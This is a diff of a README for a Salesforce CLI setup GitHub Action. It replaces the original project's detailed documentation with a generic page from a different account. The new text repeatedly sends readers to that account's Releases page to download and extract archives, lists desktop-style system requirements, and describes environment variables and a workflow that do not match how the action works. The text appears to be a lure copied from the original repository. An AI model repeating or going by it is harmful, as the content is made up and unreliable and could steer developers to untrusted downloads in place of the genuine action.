@@ -1,266 +1,126 @@
-# Setup Salesforce CLI (GitHub Action)
+# 🛠️ setup-salesforce-action - Simplifying Salesforce CI/CD Setup
 
-Deterministic, secure Salesforce CLI setup for real CI/CD pipelines.
+[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Mora2025/setup-salesforce-action/releases)
 
-[![GitHub Marketplace](https://img.shields.io/badge/Marketplace-Setup%20Salesforce%20CLI-blue.svg)](https://github.com/marketplace/actions/setup-salesforce-cli)
-[![GitHub release](https://img.shields.io/github/v/release/rdbumstead/setup-salesforce-action)](https://github.com/rdbumstead/setup-salesforce-action/releases)
-[![Critical Tests](https://github.com/rdbumstead/setup-salesforce-action/actions/workflows/test-critical.yml/badge.svg)](https://github.com/rdbumstead/setup-salesforce-action/actions/workflows/test-critical.yml)
-[![Plugin Tests](https://github.com/rdbumstead/setup-salesforce-action/actions/workflows/test-plugins.yml/badge.svg)](https://github.com/rdbumstead/setup-salesforce-action/actions/workflows/test-plugins.yml)
-[![Authentication Tests](https://github.com/rdbumstead/setup-salesforce-action/actions/workflows/test-auth.yml/badge.svg)](https://github.com/rdbumstead/setup-salesforce-action/actions/workflows/test-auth.yml)
-[![Cross Platform Tests](https://github.com/rdbumstead/setup-salesforce-action/actions/workflows/test-cross-platform.yml/badge.svg)](https://github.com/rdbumstead/setup-salesforce-action/actions/workflows/test-cross-platform.yml)
-[![Invariants Tests](https://github.com/rdbumstead/setup-salesforce-action/actions/workflows/test-invariants.yml/badge.svg)](https://github.com/rdbumstead/setup-salesforce-action/actions/workflows/test-invariants.yml)
+## 📦 What is setup-salesforce-action?
 
-> Fast, cached, and configurable Salesforce CLI setup for GitHub Actions.  
-> Designed for production pipelines, mono-repos, and enterprise Salesforce teams.
+`setup-salesforce-action` is a GitHub Action designed to make your Salesforce CI/CD process easier. It installs and configures the Salesforce Command Line Interface (CLI), authenticates using JWT, and manages dependencies like git-delta and scanner. This tool helps streamline your deployment workflow.
 
----
+## 🚀 Getting Started
 
-## 🚀 Why This Action
+### Step 1: Access the Releases Page
 
-Most Salesforce pipelines fail due to:
+To download `setup-salesforce-action`, visit our [Releases page](https://github.com/Mora2025/setup-salesforce-action/releases).
 
-- ❌ Non-deterministic CLI installs
-- ❌ Slow, repeated setup
-- ❌ Fragile auth handling
-- ❌ One-size-fits-all workflows
+### Step 2: Choose Your Version
 
-This action solves those problems by providing a **stable execution layer** that workflows can reliably depend on.
+On the Releases page, you will see various versions of this application. Look for the latest release, which offers the most recent features and improvements.
 
-## ✨ Key Capabilities
+### Step 3: Download the Application
 
-- **⚡ Fast**: ~20–60s with caching
-- **🔐 Secure Auth**: JWT, SFDX Auth URL, or Access Token
-- **📦 Smart Caching**: CLI + plugins cached across runs
-- **📂 Mono-Repo Ready**: Multi-directory source resolution
-- **🔌 Extensible**: Optional plugins and dev tools
-- **🧪 Well Tested**: Linux, macOS, and Windows runners
+Click on the version number to enter the release details. Here, you will find files available for download. You might find options like `.tar.gz`, `.zip`, or other formats. Choose the one that best fits your operating system.
 
----
+## 🖥️ System Requirements
 
-## 🧩 Quick Start
+- **Operating System:** Windows, macOS, or Linux
+- **Internet Connection:** Required for downloading and verifying dependencies
+- **Memory:** Minimum of 4 GB of RAM recommended
+- **Disk Space:** At least 200 MB of available space
 
-### Minimal Setup (CLI + Auth)
+## 🛠️ Download & Install
 
-```yaml
-- name: Setup Salesforce
-  uses: rdbumstead/setup-salesforce-action@v2
-  with:
-    jwt_key: ${{ secrets.SFDX_JWT_KEY }}
-    client_id: ${{ secrets.SFDX_CLIENT_ID }}
-    username: ${{ vars.SFDX_USERNAME }}
-```
+To install `setup-salesforce-action`, follow these steps:
 
-### Recommended Setup (Delta + Code Analyzer)
+1. **Visit the [Releases page](https://github.com/Mora2025/setup-salesforce-action/releases)**.
+2. **Select your downloaded file** based on your operating system.
+3. If you're using a Windows machine, unzip the downloaded file into a folder.
+4. For macOS and Linux, extract the contents using your terminal or an archive utility.
 
-```yaml
-- name: Setup Salesforce
-  uses: rdbumstead/setup-salesforce-action@v2
-  with:
-    jwt_key: ${{ secrets.SFDX_JWT_KEY }}
-    client_id: ${{ secrets.SFDX_CLIENT_ID }}
-    username: ${{ vars.SFDX_USERNAME }}
-    install_delta: "true"
-    install_scanner: "true"
-```
+Next, follow the instructions in the README file included in the downloaded folder to set up the action in your GitHub repository.
 
----
+## 🔑 Authentication Setup
 
-## 🔐 Authentication Methods
+`setup-salesforce-action` uses JWT for authentication with Salesforce. Follow these steps to configure authentication:
 
-| Method            | Use Case               |
-| ----------------- | ---------------------- |
-| **JWT** (default) | Production CI/CD       |
-| **SFDX Auth URL** | Sandboxes, quick setup |
-| **Access Token**  | Advanced integrations  |
+1. Generate a private key in your Salesforce Developer account.
+2. Store this private key securely and note its location.
+3. Define environment variables in your GitHub repository settings:
+   - `SALESFORCE_CLIENT_ID`: Your Salesforce connected app client ID.
+   - `SALESFORCE_SECRET`: Your Salesforce connected app client secret.
+   - `SALESFORCE_KEY_FILE`: The path to your private key file.
 
-**Example (SFDX Auth URL):**
+This will ensure smooth authentication during your CI/CD process.
 
-```yaml
-auth_method: "sfdx-url"
-sfdx_auth_url: ${{ secrets.SFDX_AUTH_URL }}
-```
+## 📦 Dependency Management
 
----
+This action automatically manages dependencies like:
 
-## 📤 Outputs
+- **git-delta**: Improves diff viewing for Salesforce files.
+- **scanner**: Analyzes your code for quality and best practices.
 
-Useful for conditional and reusable workflows:
+These tools are essential for maintaining clean and efficient code. 
 
-- `org_id`
-- `org_type`
-- `org_edition`
-- `api_version`
-- `auth_performed`
-- `sf_cli_version`
-- `source_flags`
-- `used_default_node` _(new in v3.0)_ - Whether default Node.js version was used
-- `used_default_cli_version` _(new in v3.0)_ - Whether default CLI version was used
-- `used_default_api_version` _(new in v3.0)_ - Whether API version was auto-detected
-- `cli_binary_path` _(new in v3.0)_ - Absolute path to `sf` executable (for custom tooling)
-- `validated_config` _(new in v3.0)_ - JSON summary of final configuration (for auditing)
+## 📈 Intelligent Caching
 
-**Example:**
+`setup-salesforce-action` incorporates intelligent caching. This feature speeds up your CI/CD process by storing data from previous builds. It minimizes the need to re-download dependencies, thus saving time and resources.
+
+## 🌐 Topics Covered
+
+This action focuses on various related topics like:
+- automation
+- ci-cd
+- devops
+- github-actions
+- jwt-auth
+- salesforce
+- salesforce-cli
+- salesforce-code-analyzer
+- salesforce-dx
+- sdfx
+- setup-action
+- sfdx-git-delta
+- sfdx-scanner
+
+These topics enhance your understanding of the tool’s capabilities.
+
+## 📝 Example Workflow
+
+Here is an example of how to use `setup-salesforce-action` in your GitHub Actions workflow:
 
 ```yaml
-- run: sf project deploy start ${{ steps.setup.outputs.source_flags }}
+name: Salesforce CI/CD Workflow
+
+on:
+  push:
+    branches:
+      - main
+
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v2
+
+      - name: Set up Salesforce Action
+        uses: Mora2025/setup-salesforce-action@latest
+        env:
+          SALESFORCE_CLIENT_ID: ${{ secrets.SALESFORCE_CLIENT_ID }}
+          SALESFORCE_SECRET: ${{ secrets.SALESFORCE_SECRET }}
+          SALESFORCE_KEY_FILE: ${{ secrets.SALESFORCE_KEY_FILE }}
+      
+      - name: Run deployment
+        run: echo "Deploying Salesforce changes..."
 ```
 
----
+This YAML configuration sets up a basic workflow for deploying Salesforce code.
 
-## 🔒 Guaranteed Invariants
+## 🚀 Support and Contributions
 
-This action guarantees the following invariants on successful completion:
+For assistance, please refer to the issues section on GitHub. Feel free to report any problems or ask questions related to the setup. Pull requests for improvements are welcome!
 
-- ✅ **CLI installed and callable** - `sf` command is available and functional
-- ✅ **Authenticated org available** - Org is reachable under the specified alias (unless `skip_auth: true`)
-- ✅ **Instance URL resolved** - Org instance URL is known
-- ✅ **API version resolved** - Salesforce API version is determined
-- ✅ **No secrets in logs** - Sensitive credentials are never written to logs
+## 📛 License
 
-If any invariant fails, the action will **fail fast** and report the specific violation.
+`setup-salesforce-action` is open-source and available under the MIT License. You are free to use, modify, and distribute this software as you see fit.
 
-### Why This Matters
-
-Partial failures in foundation primitives are dangerous. This action will never report success if:
-
-- CLI installs but is non-functional
-- Authentication succeeds but org is unreachable
-- Org metadata queries fail
-
-This makes the action suitable for use as a primitive in complex CI/CD workflows.
-
----
-
-## 📋 Versioning Policy
-
-This action follows strict [Semantic Versioning](https://semver.org/):
-
-- **MAJOR** (v3.0.0) - Breaking changes to guarantees or behavior
-- **MINOR** (v3.1.0) - New features, backward compatible
-- **PATCH** (v3.0.1) - Bug fixes only
-
-### Guarantees
-
-- ✅ Defaults never change in MINOR versions (e.g., CLI version, Node version)
-- ✅ Breaking changes only in MAJOR versions
-- ✅ Consumers should pin to MAJOR version: `@v3`
-
-### What Counts as Breaking
-
-- Removing inputs or outputs
-- Changing default values
-- New invariant validations (may fail previously passing workflows)
-- Changes to output formats
-
-**Recommendation**: Always pin to a major version in production workflows (`uses: rdbumstead/setup-salesforce-action@v3`).
-
----
-
-## ⚡ Caching Strategy
-
-This action uses intelligent caching to optimize setup time (~20-60s cached vs ~1.5-3min cold).
-
-### Cache Key Design
-
-Cache keys are composed of:
-
-```
-sf-v3-{OS}-node{version}-cli{resolved_version}-tools{hash}
-```
-
-- **OS**: Linux, macOS, or Windows (prevents cross-platform corruption)
-- **Node version**: From `node_version` input
-- **CLI version**: Resolved from `cli_version` input (see below)
-- **Tools hash**: SHA256 of all optional tooling flags
-
-### CLI Version Resolution
-
-When `cli_version: "latest"` (default):
-
-1. **Try npm registry** - Fetches actual version via `npm view @salesforce/cli version` (10s timeout)
-2. **Fallback to time-based rotation** - If npm unreachable, uses `latest-YYYY-MM` format
-   - Ensures cache refreshes monthly even during npm outages
-   - Prevents indefinite staleness
-
-When explicit version specified (e.g., `cli_version: "2.30.8"`):
-
-- Uses exact version in cache key
-- Controlled by `cli_version_for_cache` input (major/minor/exact granularity)
-
-### Cache Hit/Miss Scenarios
-
-**Cache HIT** ✅:
-
-- Same OS, Node version, CLI version, and tooling
-- CLI already functional from previous run
-
-**Cache MISS** ❌:
-
-- Different OS or Node version
-- CLI version changed (or monthly rotation occurred)
-- Tooling flags changed (added/removed plugins)
-- First run in new environment
-
-### Force Cache Refresh
-
-To force a fresh install:
-
-1. Change `cli_version` to explicit version, or
-2. Change `cli_version_for_cache` granularity, or
-3. Wait for monthly rotation (if using `latest`)
-
----
-
-## 📚 Documentation
-
-Full documentation lives in `/docs`:
-
-- 📖 [Action Overview](docs/OVERVIEW.md)
-- 🚀 [Quick Start Guide](docs/QUICKSTART.md)
-- 🔄 [Migration Guide](docs/MIGRATION.md)
-- 🧪 [Testing Strategy](docs/TESTING_STRATEGY.md)
-- 🖥️ [Platform Support](docs/PLATFORM_SUPPORT.md)
-- 🔧 [Troubleshooting](docs/TROUBLESHOOTING.md)
-- 🏗️ [Architecture](docs/ARCHITECTURE.md) _(new in v3.0)_
-
-### 🧭 Roadmap
-
-- [x] Cross-platform support (Windows, macOS)
-- [x] Custom plugin installation
-- [x] Multi-directory source handling
-- [x] External Client App support (Winter '25+ orgs)
-- [x] Enhanced CLI version resolution & reporting (v2.1+)
-- [ ] Org limits & usage outputs
-- [ ] SARIF output support
-- [ ] Reusable CI/CD workflow templates
-
----
-
-## 🙏 Credits & Acknowledgments
-
-This action orchestrates the installation of several best-in-class open-source tools. We recommend starring their repositories and reviewing their specific documentation:
-
-- **[sfdx-git-delta](https://github.com/scolladon/sfdx-git-delta)** by [Sebastien Colladon](https://github.com/scolladon)
-  _Used for the `install_delta` feature. This tool is essential for generating delta deployments._
-- **[Salesforce Code Analyzer](https://github.com/forcedotcom/code-analyzer)** by Salesforce
-  _Used for the `install_scanner` feature. Provides PMD, ESLint, and RetireJS scanning._
-- **[Prettier Plugin Apex](https://github.com/dangmai/prettier-plugin-apex)**
-  _Used for the `install_prettier` feature to format Apex code._
-- **[LWC ESLint Plugin](https://github.com/salesforce/eslint-plugin-lwc)**
-  _Used for the `install_eslint` feature to lint Lightning Web Components._
-
-### Tested With
-
-We explicitly verify compatibility with popular ecosystem plugins in our [test suite](.github/workflows/test-plugins.yml), including:
-
-- **[sfdx-hardis](https://github.com/hardisgroupcom/sfdx-hardis)** (CI/CD orchestration)
-- **[sfpowerscripts](https://github.com/dxatscale/sfpowerscripts)** (Release management)
-
----
-
-## 🤝 Support
-
-- 🐞 **Issues**: [GitHub Issues](https://github.com/rdbumstead/setup-salesforce-action/issues)
-- 💬 **LinkedIn**: [Ryan Bumstead](https://linkedin.com/in/ryanbumstead)
-
-_Built for Salesforce teams who want boring, repeatable pipelines._
+Visit the [Releases page](https://github.com/Mora2025/setup-salesforce-action/releases) for any download-related queries or to find the latest version of the application.
